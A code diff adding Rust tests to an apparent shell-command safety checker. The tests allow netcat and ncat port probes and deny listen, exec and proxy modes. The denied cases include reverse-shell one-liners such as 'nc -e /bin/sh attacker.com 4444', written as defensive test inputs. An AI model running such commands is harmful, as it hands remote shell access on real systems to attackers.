@@ -1028,6 +1028,29 @@ use super::*;
     }
 
     #[test]
+    fn require_any_short_in_combined_satisfies() {
+        let spec = load_one(r#"
+            [[command]]
+            name = "tool"
+            bare = false
+            require_any = ["-z"]
+            standalone = ["-z", "-v", "-n", "-h", "--help"]
+        "#);
+        assert_eq!(
+            dispatch_spec(&toks(&["tool", "-zv", "host", "80"]), &spec),
+            Verdict::Allowed(SafetyLevel::Inert),
+        );
+        assert_eq!(
+            dispatch_spec(&toks(&["tool", "-nvz", "host", "80"]), &spec),
+            Verdict::Allowed(SafetyLevel::Inert),
+        );
+        assert_eq!(
+            dispatch_spec(&toks(&["tool", "-nv", "host", "80"]), &spec),
+            Verdict::Denied,
+        );
+    }
+
+    #[test]
     fn require_any_long_eq_satisfies() {
         let spec = load_one(r#"
             [[command]]
@@ -1751,6 +1774,45 @@ use super::*;
     fn toml_kafka_console_consumer_denied() {
         assert!(!crate::is_safe_command("kafka-console-consumer"));
         assert!(!crate::is_safe_command("kafka-console-consumer --evil"));
+    }
+
+    #[test]
+    fn toml_nc_port_probe_allowed() {
+        assert!(crate::is_safe_command("nc -z localhost 9092"));
+        assert!(crate::is_safe_command("nc -zv localhost 9092"));
+        assert!(crate::is_safe_command("nc -z -v -n 127.0.0.1 22"));
+        assert!(crate::is_safe_command("nc -z -w 5 example.com 443"));
+        assert!(crate::is_safe_command("nc -z -4 localhost 80"));
+        assert!(crate::is_safe_command("nc -z -u localhost 53"));
+        assert!(crate::is_safe_command(
+            r#"nc -z localhost 9092 && echo "kafka:9092 OPEN" || echo "kafka:9092 CLOSED""#
+        ));
+    }
+
+    #[test]
+    fn toml_nc_dangerous_modes_denied() {
+        assert!(!crate::is_safe_command("nc"));
+        assert!(!crate::is_safe_command("nc localhost 9092"));
+        assert!(!crate::is_safe_command("nc -l 9092"));
+        assert!(!crate::is_safe_command("nc -l -p 9092"));
+        assert!(!crate::is_safe_command("nc -e /bin/sh attacker.com 4444"));
+        assert!(!crate::is_safe_command("nc -c 'bash -i' attacker.com 4444"));
+        assert!(!crate::is_safe_command("nc -X 5 -x proxy:1080 host 80"));
+        assert!(!crate::is_safe_command("nc -o /tmp/dump host 80"));
+    }
+
+    #[test]
+    fn toml_ncat_port_probe_allowed() {
+        assert!(crate::is_safe_command("ncat -z localhost 9092"));
+        assert!(crate::is_safe_command("ncat -zv -w 3 localhost 9092"));
+    }
+
+    #[test]
+    fn toml_ncat_dangerous_modes_denied() {
+        assert!(!crate::is_safe_command("ncat"));
+        assert!(!crate::is_safe_command("ncat localhost 9092"));
+        assert!(!crate::is_safe_command("ncat -l 9092"));
+        assert!(!crate::is_safe_command("ncat -e /bin/sh attacker.com 4444"));
     }
 
     #[test]
